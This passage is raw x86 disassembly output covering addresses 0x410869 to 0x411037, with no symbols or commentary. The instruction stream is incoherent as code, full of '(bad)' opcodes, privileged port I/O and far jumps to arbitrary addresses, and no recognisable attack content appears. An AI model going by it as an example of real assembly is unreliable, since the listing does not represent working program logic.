  410869:	jge    0x4108b5
  41086b:	pop    ebp
  41086c:	inc    ecx
  41086d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41086e:	mov    esi,ebp
  410870:	in     al,0xc0
  410872:	shl    DWORD PTR [esi+0x3b],1
  410875:	rol    BYTE PTR [ecx+0x4c5d0f68],1
  41087b:	adc    eax,0x12
  41087e:	cmc    
  41087f:	ret    0x747
  410882:	dec    edi
  410883:	jo     0x4108e3
  410885:	or     edi,esp
  410887:	dec    esp
  410888:	add    eax,0x3e5cc800
  41088d:	pop    ss
  41088e:	push   ss
  41088f:	cdq    
  410890:	fwait
  410891:	test   BYTE PTR gs:[ebx+0x380d1ad9],ch
  410898:	mov    cl,0x59
  41089a:	xor    cl,BYTE PTR [edx]
  41089c:	or     BYTE PTR [edi-0x709f5653],bl
  4108a2:	mov    WORD PTR [ebp+0x3a],es
  4108a5:	sub    eax,0xa6fc2058
  4108aa:	(bad)  
  4108ab:	or     al,BYTE PTR [ebx-0x2c]
  4108ae:	push   0x44f6fa65
  4108b3:	pop    edi
  4108b4:	cld    
  4108b5:	imul   edi,DWORD PTR cs:[eax-0x61],0x81b5c74b
  4108bd:	call   0xbf808a20
  4108c2:	adc    BYTE PTR [ebx+0x3c0be4d3],dh
  4108c8:	pop    esi
  4108c9:	je     0x41087a
  4108cb:	imul   esp,DWORD PTR [esi],0x52e6d408
  4108d1:	sbb    ebp,edx
  4108d3:	mov    ecx,0x75d46d98
  4108d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108d9:	(bad)  
  4108da:	mov    ch,0x80
  4108dc:	push   ds
  4108dd:	push   edx
  4108de:	mov    esi,0x3393d171
  4108e3:	sar    edi,1
  4108e5:	ficom  DWORD PTR [edx-0x1475e732]
  4108eb:	ror    DWORD PTR [esi-0x79],cl
  4108ee:	clc    
  4108ef:	xor    esi,DWORD PTR [eax]
  4108f1:	jns    0x4108be
  4108f3:	sbb    eax,0x3b8206de
  4108f8:	stos   DWORD PTR es:[edi],eax
  4108f9:	sub    eax,0x8d4b1a91
  4108fe:	mov    ch,0x86
  410900:	jmp    0x4108b8
  410902:	push   0x36
  410904:	xlat   BYTE PTR ds:[ebx]
  410905:	push   es
  410906:	or     al,0x3d
  410908:	ret    0x9526
  41090b:	inc    ebp
  41090c:	jecxz  0x41093a
  41090e:	xchg   edx,eax
  41090f:	push   esp
  410910:	in     eax,0xc4
  410912:	in     eax,dx
  410913:	and    DWORD PTR [esi-0x15],0x8250c07b
  41091a:	leave  
  41091b:	nop    DWORD PTR [edx]
  41091e:	pop    edx
  41091f:	lods   eax,DWORD PTR ds:[esi]
  410920:	shl    al,1
  410922:	jle    0x4108bc
  410924:	pop    esi
  410925:	ret    
  410926:	and    al,0x43
  410928:	or     ah,0x5a
  41092b:	sbb    BYTE PTR [edi+0x1db901e0],bl
  410931:	mov    dl,cl
  410933:	jge    0x4108f6
  410935:	fwait
  410936:	ss mov ah,0xe6
  410939:	jmp    0x9d9b:0xf214f50b
  410940:	or     BYTE PTR [edi],ah
  410942:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410943:	(bad)  
  410944:	pushf  
  410945:	pop    ebp
  410946:	stc    
  410947:	mov    bl,0xbe
  410949:	xor    DWORD PTR [eax-0x1a],ebx
  41094c:	and    DWORD PTR [ecx],ebx
  41094e:	aas    
  41094f:	cdq    
  410950:	popa   
  410951:	push   ebx
  410952:	mov    ecx,0x92d9836d
  410957:	gs pop eax
  410959:	and    ecx,DWORD PTR [esi+0x57bb5a69]
  41095f:	push   edi
  410960:	sahf   
  410961:	mov    dh,0x34
  410963:	mov    esi,0x376f1544
  410968:	cmp    esp,ecx
  41096a:	add    DWORD PTR [eax],0xffffff9e
  41096d:	into   
  41096e:	hlt    
  41096f:	pop    ss
  410970:	and    al,0x5d
  410972:	repnz pop edi
  410974:	cli    
  410975:	dec    edx
  410976:	ins    BYTE PTR es:[edi],dx
  410977:	push   0x87392295
  41097c:	leave  
  41097d:	addr16 cld 
  41097f:	adc    eax,0x6e039d61
  410984:	imul   ebp,eax,0xadb278f1
  41098a:	clc    
  41098b:	mov    BYTE PTR [eax],bl
  41098d:	cmp    ebx,DWORD PTR [ebx-0x59]
  410990:	fiadd  DWORD PTR [ebx-0x33eac271]
  410996:	shl    DWORD PTR [esi+0x5ff3e216],1
  41099c:	daa    
  41099d:	mov    eax,0x6ba95377
  4109a2:	adc    BYTE PTR [esi],cl
  4109a4:	pop    ss
  4109a5:	push   0x46aeef0e
  4109aa:	cmp    DWORD PTR [esi+0x17550c21],edx
  4109b0:	icebp  
  4109b1:	inc    esp
  4109b2:	sub    DWORD PTR [ebp-0x50],eax
  4109b5:	imul   ebp,DWORD PTR [edi+ebp*2-0x3887927],0x649ef424
  4109c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4109c1:	push   esi
  4109c2:	jmp    0x4109a6
  4109c4:	mov    edi,0x38a004d4
  4109c9:	cmp    al,0x4b
  4109cb:	cmp    edi,ebx
  4109cd:	or     DWORD PTR [edi+eax*8-0xdc02811],ebp
  4109d4:	sar    DWORD PTR [edx-0x2b],cl
  4109d7:	mov    dh,0x85
  4109d9:	fistp  DWORD PTR ss:[eax+0x12be9af3]
  4109e0:	repz dec esi
  4109e2:	dec    eax
  4109e3:	and    BYTE PTR cs:[ecx+0x41],dh
  4109e7:	(bad)  
  4109e9:	in     al,dx
  4109ea:	aad    0xcc
  4109ec:	inc    esp
  4109ed:	fsubrp st(2),st
  4109ef:	mov    bl,0xfa
  4109f1:	lock mov al,0x52
  4109f4:	or     eax,0xb36e7ae
  4109f9:	(bad)  
  4109fa:	pop    ebx
  4109fb:	xchg   DWORD PTR [edi],edi
  4109fd:	mov    ds:0x19e13acc,al
  410a02:	adc    dl,dh
  410a04:	mov    al,BYTE PTR [esi*1-0xedd8964]
  410a0b:	push   edx
  410a0c:	enter  0xe73a,0x9c
  410a10:	mov    dh,0xcc
  410a12:	fld    DWORD PTR [eax-0x4b50a738]
  410a18:	mov    edi,edi
  410a1a:	dec    esi
  410a1b:	cs dec ecx
  410a1d:	xor    DWORD PTR [eax],ebp
  410a1f:	cmp    eax,0xe972985
  410a24:	mov    ebp,DWORD PTR [eax+0x2e]
  410a27:	test   eax,0x55656242
  410a2c:	imul   esi,edx,0x67259233
  410a32:	or     bl,bh
  410a34:	push   cs
  410a35:	shl    BYTE PTR [edi],cl
  410a37:	popf   
  410a38:	and    al,0x99
  410a3a:	aam    0x29
  410a3c:	out    0xa,al
  410a3e:	int    0xf3
  410a40:	and    BYTE PTR [esi+0x501535d1],bh
  410a46:	test   al,dl
  410a48:	pop    ecx
  410a49:	ins    DWORD PTR es:[edi],dx
  410a4a:	int    0x39
  410a4c:	adc    eax,0x5251db47
  410a52:	mov    bh,0x7a
  410a54:	inc    esp
  410a55:	lods   al,BYTE PTR ds:[esi]
  410a56:	ins    BYTE PTR es:[edi],dx
  410a57:	hlt    
  410a58:	dec    ecx
  410a59:	(bad)  
  410a5b:	jmp    0x3badb0a1
  410a60:	sub    DWORD PTR [edi],eax
  410a62:	fbld   TBYTE PTR [esp+esi*4+0x357a67b8]
  410a69:	leave  
  410a6a:	retf   0xc6c3
  410a6d:	xor    eax,0x164e9665
  410a72:	stc    
  410a73:	adc    BYTE PTR [ebx+edx*8-0x6c50816b],ah
  410a7a:	cmp    eax,0x7bf0fc38
  410a7f:	mov    edx,0xffef2113
  410a84:	sbb    eax,0x57aa9430
  410a89:	fadd   DWORD PTR [edi-0x412e2590]
  410a8f:	mov    ch,0xce
  410a91:	dec    ebp
  410a92:	or     bl,al
  410a94:	cmp    eax,0xe8c1df70
  410a99:	pop    edx
  410a9a:	mov    dh,0xcb
  410a9c:	aaa    
  410a9d:	add    al,BYTE PTR [ebx+ecx*4-0x4c19a298]
  410aa4:	inc    edx
  410aa5:	out    dx,eax
  410aa6:	jmp    0x410b23
  410aa8:	xchg   ebp,eax
  410aa9:	sbb    BYTE PTR [ecx*8-0x3881c2dc],ah
  410ab0:	sbb    eax,0x9c626201
  410ab5:	dec    ebp
  410ab6:	outs   dx,BYTE PTR ds:[esi]
  410ab7:	aad    0x46
  410ab9:	icebp  
  410aba:	je     0x410a6f
  410abc:	mov    ebx,0x25044547
  410ac1:	call   0xbb174abc
  410ac6:	jbe    0x410b25
  410ac8:	mov    dl,0xf
  410aca:	into   
  410acb:	xor    DWORD PTR [eax+0x1],esp
  410ace:	push   eax
  410acf:	loopne 0x410b29
  410ad1:	out    dx,eax
  410ad2:	add    BYTE PTR [ecx+0x7b],cl
  410ad5:	fidiv  DWORD PTR [edi+edi*4]
  410ad8:	push   esp
  410ad9:	dec    ecx
  410ada:	outs   dx,DWORD PTR ds:[esi]
  410adb:	call   FWORD PTR ds:0xd3b5fb05
  410ae1:	test   eax,0x4227aa28
  410ae6:	sbb    dh,BYTE PTR [edx+0x71]
  410ae9:	es pushf 
  410aeb:	inc    eax
  410aec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410aed:	or     esp,esi
  410aef:	call   0x8514:0xe7d03dea
  410af6:	push   ebx
  410af7:	out    dx,al
  410af8:	add    BYTE PTR [edi-0x49da541f],bl
  410afe:	lock inc ecx
  410b00:	popa   
  410b01:	or     al,0x8c
  410b03:	inc    esi
  410b04:	inc    edx
  410b05:	ret    
  410b06:	pop    esp
  410b07:	cmp    bh,bh
  410b09:	dec    esp
  410b0a:	mov    ebx,0xc77c015
  410b0f:	adc    BYTE PTR [ebx-0x6139cf18],0xe2
  410b16:	(bad)  
  410b17:	adc    DWORD PTR [esi-0x64],ecx
  410b1a:	test   BYTE PTR [edx+0x17bfc70],dl
  410b20:	stos   DWORD PTR es:[edi],eax
  410b21:	mov    cl,0xe3
  410b23:	in     eax,0x33
  410b25:	loope  0x410b95
  410b27:	inc    ebx
  410b28:	push   ecx
  410b29:	shl    DWORD PTR ds:0xfbf6fa61,1
  410b2f:	push   es
  410b30:	loope  0x410b05
  410b32:	lods   eax,DWORD PTR ds:[esi]
  410b33:	outs   dx,DWORD PTR ds:[esi]
  410b34:	push   ds
  410b35:	mov    ebx,0x56c0c29e
  410b3a:	sub    eax,0x26f224f1
  410b3f:	or     al,BYTE PTR [ebp+0x59]
  410b42:	sbb    edi,DWORD PTR gs:[edi+0x78c9f71]
  410b49:	and    DWORD PTR [esi],eax
  410b4b:	imul   DWORD PTR [edx+0x7693ff00]
  410b51:	cld    
  410b52:	je     0x410b68
  410b54:	aad    0x64
  410b56:	stos   BYTE PTR es:[edi],al
  410b57:	mov    BYTE PTR [ebx-0x28],ah
  410b5a:	fld1   
  410b5c:	xor    eax,0xd3387afd
  410b61:	mov    ds:0x36ec5f46,eax
  410b66:	pop    eax
  410b67:	mov    fs,WORD PTR [edi]
  410b69:	mov    al,0xf
  410b6b:	es add cl,0x0
  410b6f:	dec    ebx
  410b70:	rcr    DWORD PTR [ebx],cl
  410b72:	adc    DWORD PTR [ecx-0x74],esp
  410b75:	or     DWORD PTR [edi+0x5b],ebx
  410b78:	sahf   
  410b79:	mov    esi,0xa5c774df
  410b7e:	test   DWORD PTR [edi+0x75],eax
  410b81:	inc    edx
  410b82:	div    BYTE PTR [esi-0x4ce7f494]
  410b88:	icebp  
  410b89:	scas   al,BYTE PTR es:[edi]
  410b8a:	fldcw  WORD PTR [edi]
  410b8c:	or     esi,0x88b0496c
  410b92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b93:	(bad)  
  410b95:	call   0xb942:0xcb9d71cb
  410b9c:	jle    0x410b3e
  410b9e:	or     edx,edx
  410ba0:	adc    BYTE PTR [edi],ah
  410ba2:	jnp    0x410b37
  410ba4:	sbb    eax,0x4385aa77
  410ba9:	and    eax,esi
  410bab:	or     eax,0x489cbf2d
  410bb0:	jmp    0x410c12
  410bb2:	jg     0x410b82
  410bb4:	mov    esi,0xe94092ef
  410bb9:	or     al,0x4a
  410bbb:	inc    ecx
  410bbc:	xchg   esi,eax
  410bbd:	xlat   BYTE PTR ds:[ebx]
  410bbf:	test   DWORD PTR [esi-0x68462970],ecx
  410bc5:	out    dx,eax
  410bc6:	mov    bh,0xd7
  410bc8:	popf   
  410bc9:	mov    bl,0xec
  410bcb:	adc    ah,BYTE PTR [eax]
  410bcd:	js     0x410bb2
  410bcf:	adc    ah,bl
  410bd1:	jnp    0x410b64
  410bd3:	xlat   BYTE PTR ds:[ebx]
  410bd4:	stos   BYTE PTR es:[edi],al
  410bd5:	out    dx,al
  410bd6:	jne    0x410b8d
  410bd8:	sub    al,BYTE PTR [eax]
  410bda:	mov    BYTE PTR [edi+0x64],ch
  410bdd:	jmp    0x3e8cfec6
  410be2:	inc    esi
  410be3:	mov    dl,0xa8
  410be5:	mov    bh,0x8c
  410be7:	add    DWORD PTR [edi-0x3e],esp
  410bea:	mov    al,0x54
  410bec:	xchg   edx,eax
  410bed:	repnz in eax,0xc1
  410bf0:	push   ecx
  410bf1:	sbb    al,0x5a
  410bf3:	(bad)  
  410bf4:	sahf   
  410bf5:	jnp    0x410c01
  410bf7:	sti    
  410bf8:	scas   al,BYTE PTR es:[edi]
  410bf9:	shl    eax,cl
  410bfb:	xchg   esi,eax
  410bfc:	mov    dh,0x6
  410bfe:	xchg   edx,esi
  410c00:	daa    
  410c01:	stc    
  410c02:	jmp    0x410bd6
  410c04:	(bad)  
  410c05:	cld    
  410c06:	jnp    0x410bbe
  410c08:	imul   eax,DWORD PTR [esi+0x74],0x88875cf2
  410c0f:	(bad)  
  410c10:	fsub   DWORD PTR ds:0x3cf334a1
  410c16:	fadd   DWORD PTR [edi+0x2d]
  410c19:	sahf   
  410c1a:	and    DWORD PTR [edx-0x43d29b95],ecx
  410c20:	or     eax,0x71cc0d04
  410c25:	push   0x85646caf
  410c2a:	test   BYTE PTR [edi-0x117885a8],al
  410c30:	mov    ebp,0x7886693f
  410c35:	bound  eax,QWORD PTR [eax-0x552ebf53]
  410c3b:	shr    DWORD PTR [eax+0x78d129b6],1
  410c41:	xchg   ebx,eax
  410c42:	clc    
  410c43:	pushf  
  410c44:	test   al,0xd
  410c46:	aas    
  410c47:	jns    0x410c5c
  410c49:	popa   
  410c4a:	xor    DWORD PTR [ecx],edi
  410c4c:	pop    edi
  410c4d:	ja     0x410c97
  410c4f:	sbb    DWORD PTR [ecx-0x7d87af79],ebp
  410c55:	xchg   esi,eax
  410c56:	push   ebp
  410c57:	and    al,0x31
  410c59:	scas   eax,DWORD PTR es:[edi]
  410c5a:	pop    ecx
  410c5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c5c:	jg     0x410cab
  410c5e:	inc    esi
  410c5f:	sub    eax,0x4c142fcf
  410c64:	les    edi,FWORD PTR [eax]
  410c66:	addr16 fldcw WORD PTR [bp+di-0x28aa]
  410c6c:	add    BYTE PTR [ebp-0x138037f8],0x9a
  410c73:	in     eax,0x22
  410c75:	ret    0xb104
  410c78:	je     0x410c28
  410c7a:	push   esp
  410c7b:	aam    0x23
  410c7d:	xor    BYTE PTR [eax+eiz*2-0xf29e89c],al
  410c84:	jmp    0x5ae99872
  410c89:	(bad)  
  410c8a:	adc    eax,0xa4d0866a
  410c8f:	push   eax
  410c90:	add    al,BYTE PTR [esi]
  410c92:	jmp    0x410c34
  410c94:	adc    ecx,esi
  410c96:	repnz cld 
  410c98:	cmp    ebp,edx
  410c9a:	sbb    eax,0xb91f99ab
  410c9f:	add    DWORD PTR [esi+edi*8+0x55346e98],ecx
  410ca6:	adc    eax,0xeef3c207
  410cab:	das    
  410cac:	scas   eax,DWORD PTR es:[edi]
  410cad:	push   esp
  410cae:	rcl    DWORD PTR [ebx],1
  410cb0:	xchg   BYTE PTR [ebp+0x40],dh
  410cb3:	xchg   esi,eax
  410cb4:	scas   al,BYTE PTR es:[di]
  410cb6:	aam    0x52
  410cb8:	xchg   dl,ch
  410cba:	or     eax,DWORD PTR [ebx+edx*4]
  410cbd:	int    0x77
  410cbf:	xchg   esp,eax
  410cc0:	ins    DWORD PTR es:[edi],dx
  410cc1:	xchg   esi,eax
  410cc2:	xlat   BYTE PTR ds:[ebx]
  410cc3:	nop
  410cc4:	js     0x410d1a
  410cc6:	sub    BYTE PTR [ebp+edx*4+0x20],bl
  410cca:	out    dx,al
  410ccb:	shl    DWORD PTR [edi-0x4f],1
  410cce:	lods   eax,DWORD PTR ds:[esi]
  410ccf:	sub    BYTE PTR [edx+0x69],0xd1
  410cd3:	cmp    edx,DWORD PTR [edx+0x1a]
  410cd6:	clc    
  410cd7:	dec    DWORD PTR [edx-0x10]
  410cda:	xchg   edi,eax
  410cdb:	clc    
  410cdc:	ret    
  410cdd:	mov    ecx,0xfb44e7ab
  410ce2:	sub    ebx,0x9e281eeb
  410ce8:	outs   dx,DWORD PTR ds:[esi]
  410ce9:	pop    ecx
  410cea:	inc    ebx
  410ceb:	loop   0x410cba
  410ced:	push   eax
  410cee:	inc    edi
  410cef:	sbb    eax,0xbc647f50
  410cf4:	and    edi,DWORD PTR [eax]
  410cf6:	test   BYTE PTR [ebx*1-0x3044db5],bl
  410cfd:	lds    ebp,FWORD PTR [eax-0x64]
  410d00:	xchg   esp,eax
  410d01:	pop    edx
  410d02:	mov    al,ds:0x8a32a44f
  410d07:	push   0x14
  410d09:	je     0x410cfa
  410d0b:	ret    0x431d
  410d0e:	lea    esi,[edx-0x26]
  410d11:	mov    eax,DWORD PTR [edx]
  410d13:	jb     0x410cce
  410d15:	mov    WORD PTR [ebx-0x4223222],cs
  410d1b:	mov    ch,0xa5
  410d1d:	ins    DWORD PTR es:[edi],dx
  410d1e:	dec    edx
  410d1f:	aas    
  410d20:	imul   esi,DWORD PTR [edi-0x6b],0x723a2458
  410d27:	push   esp
  410d28:	imul   ah
  410d2a:	mov    BYTE PTR [edi-0x282cc861],bl
  410d30:	cmp    edx,DWORD PTR [edi+0x43]
  410d33:	sbb    eax,0x1e674b8e
  410d38:	shl    dh,0xc3
  410d3b:	loopne 0x410da8
  410d3d:	adc    BYTE PTR [eax+eiz*8+0x12cee264],ch
  410d44:	mov    ah,0x4c
  410d46:	add    DWORD PTR [ebp+edi*8+0x59],edi
  410d4a:	je     0x410d33
  410d4c:	push   eax
  410d4d:	mov    ah,0x79
  410d4f:	mov    dl,0x36
  410d51:	cvtps2pi mm0,QWORD PTR [esi+ecx*1+0x3ec03970]
  410d59:	jge    0x410d7b
  410d5b:	mov    al,0x79
  410d5d:	add    eax,0x7cee8ef4
  410d62:	pop    esp
  410d63:	push   0x1e
  410d65:	sub    DWORD PTR [esi-0x31],edi
  410d68:	imul   eax,DWORD PTR [edi+ebx*8],0x27
  410d6c:	addr16 daa 
  410d6e:	lods   al,BYTE PTR gs:[esi]
  410d70:	cwde   
  410d71:	retf   0x57e6
  410d74:	inc    edi
  410d75:	cmp    DWORD PTR [ecx+0x7d],esp
  410d78:	cld    
  410d79:	push   ebx
  410d7a:	arpl   di,di
  410d7c:	stc    
  410d7d:	add    al,0x80
  410d7f:	and    BYTE PTR [esi-0xa3f8ba3],0x3b
  410d86:	or     ebx,DWORD PTR [eax+0x45]
  410d89:	outs   dx,DWORD PTR ds:[esi]
  410d8a:	out    dx,al
  410d8b:	jbe    0x410df9
  410d8d:	jmp    0x594ff999
  410d92:	push   cs
  410d93:	stos   DWORD PTR es:[edi],eax
  410d94:	sbb    DWORD PTR [eax+0x6586eec1],esp
  410d9a:	lods   eax,DWORD PTR ds:[esi]
  410d9b:	jg     0x410d3f
  410d9d:	sti    
  410d9e:	and    DWORD PTR [ecx-0x64ce2d91],eax
  410da4:	outs   dx,DWORD PTR es:[esi]
  410da6:	sbb    al,0x61
  410da8:	rcl    DWORD PTR [ecx+0x196704d8],0x46
  410daf:	sub    DWORD PTR [ebx+0x7aab6fe6],esp
  410db5:	int3   
  410db6:	(bad)  
  410db7:	js     0x410df6
  410db9:	inc    ecx
  410dba:	add    bh,BYTE PTR [edi-0x2a]
  410dbd:	rcl    ecx,1
  410dbf:	(bad)  
  410dc0:	das    
  410dc1:	push   ds
  410dc2:	cmp    cl,BYTE PTR [edi-0x1a205d6f]
  410dc8:	inc    ebp
  410dc9:	out    dx,eax
  410dca:	push   es
  410dcb:	mov    esp,0x1212b760
  410dd0:	fisub  WORD PTR [edx]
  410dd2:	inc    ebx
  410dd3:	fsubr  QWORD PTR [ecx-0x11a603fe]
  410dd9:	cmp    al,0x3d
  410ddb:	mov    eax,ds:0x30d42114
  410de0:	cmp    ebp,DWORD PTR [ebp+0xff56969]
  410de6:	sub    ebx,eax
  410de8:	push   esp
  410de9:	mov    esp,0x23228d12
  410dee:	pop    ds
  410def:	rcl    BYTE PTR [ebx+esi*1+0x5a2a2c37],cl
  410df6:	inc    edx
  410df7:	test   BYTE PTR [esi+0x43],cl
  410dfa:	jno    0x410e55
  410dfc:	and    eax,0xe4169d30
  410e01:	push   ebp
  410e02:	mov    DWORD PTR [esi],0x1558b563
  410e08:	stc    
  410e09:	mov    WORD PTR [ebp-0x2f],fs
  410e0c:	iret   
  410e0d:	and    al,0x50
  410e0f:	daa    
  410e10:	scas   al,BYTE PTR es:[edi]
  410e11:	cmp    al,0xdd
  410e13:	xor    DWORD PTR ds:0x8612575,eax
  410e19:	and    edi,edi
  410e1b:	outs   dx,DWORD PTR ds:[esi]
  410e1c:	fs pop ecx
  410e1e:	mul    BYTE PTR [esi+ecx*8]
  410e21:	shr    cl,cl
  410e23:	sbb    al,0x73
  410e25:	nop
  410e26:	push   edx
  410e27:	jbe    0x410de5
  410e29:	sbb    bl,BYTE PTR ds:0x8074784c
  410e2f:	iret   
  410e30:	mov    dh,0xaa
  410e32:	xor    BYTE PTR [ecx+0x59738150],bl
  410e38:	xchg   BYTE PTR [ebx+ebp*4+0x30282ff0],cl
  410e3f:	push   ds
  410e40:	stos   BYTE PTR es:[edi],al
  410e41:	mov    ?,esi
  410e43:	add    ebp,ebx
  410e45:	mov    ebp,0x2b1e18b0
  410e4a:	loopne 0x410e62
  410e4c:	cmp    eax,0x1f1c49d
  410e51:	dec    eax
  410e52:	je     0x410eb6
  410e54:	xchg   ebp,eax
  410e55:	adc    eax,0xb14149ae
  410e5a:	cmp    ebx,DWORD PTR [ecx]
  410e5c:	xchg   ebp,eax
  410e5d:	mov    al,ds:0x4abfc1cb
  410e62:	mov    bl,0x1e
  410e64:	retf   0x51b5
  410e67:	ja     0x410e91
  410e69:	iret   
  410e6a:	adc    DWORD PTR [bp+0x20e3],ecx
  410e6f:	(bad)  
  410e71:	aam    0x65
  410e73:	push   ds
  410e74:	mov    ch,0x99
  410e76:	sahf   
  410e77:	jae    0x410eee
  410e79:	cli    
  410e7a:	dec    ebx
  410e7b:	and    BYTE PTR [esp+eax*8+0x5571537d],bh
  410e82:	in     al,dx
  410e83:	je     0x410eed
  410e85:	dec    edx
  410e86:	cmc    
  410e87:	call   0x32a7:0x524c2fd0
  410e8e:	xchg   BYTE PTR [edi+0x2cfadc77],dl
  410e94:	mov    eax,ebp
  410e96:	mov    eax,ds:0xa3ec88a9
  410e9b:	rcl    ecx,cl
  410e9d:	idiv   edx
  410e9f:	pop    edx
  410ea0:	sub    DWORD PTR [ebp-0x2b2ad55c],ebx
  410ea6:	jmp    0x410eea
  410ea8:	add    eax,DWORD PTR [edi]
  410eaa:	push   ss
  410eab:	fst    DWORD PTR [ebp+0x1de33b69]
  410eb1:	sub    eax,DWORD PTR [ebx-0x68]
  410eb4:	out    0x4d,eax
  410eb6:	cmp    eax,0x8ad79451
  410ebb:	lods   eax,DWORD PTR ds:[esi]
  410ebc:	pop    ebp
  410ebd:	add    esi,DWORD PTR [ebp-0x47]
  410ec0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ec1:	mov    al,0x41
  410ec3:	xchg   al,cl
  410ec5:	fstp   st(4)
  410ec7:	push   ebp
  410ec8:	clc    
  410ec9:	(bad)  
  410ecb:	and    eax,DWORD PTR [edx+0x50]
  410ece:	xchg   esp,eax
  410ecf:	pop    edi
  410ed0:	mov    ecx,edi
  410ed2:	or     eax,0x6b00db7d
  410ed7:	loop   0x410f0c
  410ed9:	xor    al,0xfc
  410edb:	popf   
  410edc:	xlat   BYTE PTR ds:[ebx]
  410edd:	push   edi
  410ede:	cmc    
  410edf:	sti    
  410ee0:	popf   
  410ee1:	pop    ss
  410ee2:	lock fild WORD PTR [ebx]
  410ee5:	xlat   BYTE PTR ds:[ebx]
  410ee6:	retf   
  410ee7:	add    al,0x1e
  410ee9:	in     eax,dx
  410eea:	mov    ebx,0x26c0a19d
  410eef:	pop    ss
  410ef0:	test   BYTE PTR [esi-0x69c2d5f7],dh
  410ef6:	call   0x8f11:0x4b634cf0
  410efd:	enter  0xcab1,0x1e
  410f01:	ds sbb al,0x96
  410f04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f05:	sbb    al,0xff
  410f07:	lds    ebx,FWORD PTR [ebp+0x43b1e425]
  410f0d:	add    dl,ah
  410f0f:	ja     0x410f34
  410f11:	mov    esp,0x9f8cf712
  410f16:	cs adc al,0x9b
  410f19:	das    
  410f1a:	mov    WORD PTR [edx+0x3d],ss
  410f1d:	or     al,0x4d
  410f1f:	sahf   
  410f20:	std    
  410f21:	(bad)  
  410f22:	xchg   ebp,eax
  410f23:	lds    esi,FWORD PTR [ebx]
  410f25:	(bad)  
  410f26:	es daa 
  410f28:	popa   
  410f29:	mov    bl,BYTE PTR [ebx+eiz*8+0x33]
  410f2d:	sbb    eax,0x451d904a
  410f32:	push   edi
  410f33:	or     ecx,edx
  410f35:	xchg   ebp,eax
  410f36:	mov    edx,0x5db4ce20
  410f3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f3c:	mov    edi,ss
  410f3e:	ds jno 0x410fbe
  410f41:	push   ebp
  410f42:	mov    BYTE PTR [ecx+0x5a],cl
  410f45:	add    DWORD PTR [ebx+0x23],edi
  410f48:	sbb    DWORD PTR [ebx],ecx
  410f4a:	mov    cl,0x17
  410f4c:	jmp    0x410f10
  410f4e:	les    ecx,FWORD PTR [edx-0x656fbd52]
  410f54:	(bad)  
  410f55:	out    0x85,al
  410f57:	mov    ah,0xae
  410f59:	mov    edi,0x83f12961
  410f5e:	lahf   
  410f5f:	pop    edx
  410f60:	pop    ebx
  410f61:	in     al,dx
  410f62:	mov    al,0x98
  410f64:	stos   DWORD PTR es:[edi],eax
  410f65:	test   bh,al
  410f67:	mov    cl,0x6c
  410f69:	aas    
  410f6a:	out    dx,eax
  410f6b:	inc    esi
  410f6c:	push   ds
  410f6d:	or     cl,BYTE PTR [edi-0x14e9c2cf]
  410f73:	scas   al,BYTE PTR es:[edi]
  410f74:	mov    edx,0xa327e35b
  410f79:	out    dx,eax
  410f7a:	or     eax,0x9750d7a5
  410f7f:	jl     0x410fd1
  410f81:	clc    
  410f82:	ja     0x410f13
  410f84:	test   BYTE PTR [ebp-0x71ff9986],0xe1
  410f8b:	out    dx,al
  410f8c:	mov    cl,0x17
  410f8e:	daa    
  410f8f:	aas    
  410f90:	(bad)  
  410f91:	popa   
  410f92:	int3   
  410f93:	das    
  410f94:	ret    0xd405
  410f97:	and    eax,0x249074cb
  410f9c:	xchg   BYTE PTR [eax-0x48],dl
  410f9f:	fdiv   DWORD PTR [eax+0x747d3ea4]
  410fa5:	hlt    
  410fa6:	sbb    BYTE PTR [esi+edx*2-0x52],cl
  410faa:	(bad)  
  410fab:	aam    0x54
  410fad:	inc    ecx
  410fae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410faf:	cmp    BYTE PTR [ebp-0xa6f404e],cl
  410fb5:	mov    ds:0x1a5f5857,eax
  410fba:	cmc    
  410fbb:	sub    ebp,ebx
  410fbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410fbe:	mov    ds:0x6518e6c7,al
  410fc3:	outs   dx,BYTE PTR ds:[esi]
  410fc4:	cmp    ecx,eax
  410fc6:	mov    ebx,0x51a90a1c
  410fcb:	loopne 0x411045
  410fcd:	fisubr WORD PTR [ebp+0x28ad76c4]
  410fd3:	mov    dh,0xae
  410fd5:	pminsw mm0,mm7
  410fd8:	lea    ebp,[ecx]
  410fda:	clc    
  410fdb:	test   esp,eax
  410fdd:	arpl   WORD PTR [edi-0x6c6abca1],bx
  410fe3:	add    cl,BYTE PTR [edi]
  410fe5:	loope  0x410fb4
  410fe7:	ds (bad) 
  410fea:	aaa    
  410feb:	das    
  410fec:	jl     0x410fda
  410fee:	dec    eax
  410fef:	xchg   ebp,eax
  410ff0:	jle    0x41100b
  410ff2:	mov    ds:0xb664751a,eax
  410ff7:	dec    edx
  410ff8:	dec    esi
  410ff9:	fs lahf 
  410ffb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ffc:	mov    ecx,0x87485ac1
  411001:	push   ss
  411002:	dec    edi
  411003:	fmulp  st(7),st
  411005:	cmp    dh,BYTE PTR [edx-0x3c]
  411008:	je     0x41104f
  41100a:	fs xchg esi,eax
  41100c:	mov    ds:0xe19abc54,eax
  411011:	iret   
  411012:	sbb    al,0x6c
  411014:	gs xor al,0x66
  411017:	loop   0x410fbf
  411019:	cmc    
  41101a:	mov    cl,0xad
  41101c:	int3   
  41101d:	sar    al,1
  41101f:	ficomp WORD PTR [esi+0x69]
  411022:	sar    DWORD PTR [di+0x59],1
  411026:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411027:	xchg   esp,eax
  411028:	jno    0x411094
  41102a:	dec    edx
  41102b:	in     al,0x8c
  41102d:	(bad)  
  41102e:	jae    0x411042
  411030:	jp     0x410ff5
  411032:	and    eax,0x4a7143d5
  411037:	jg     0x41109d
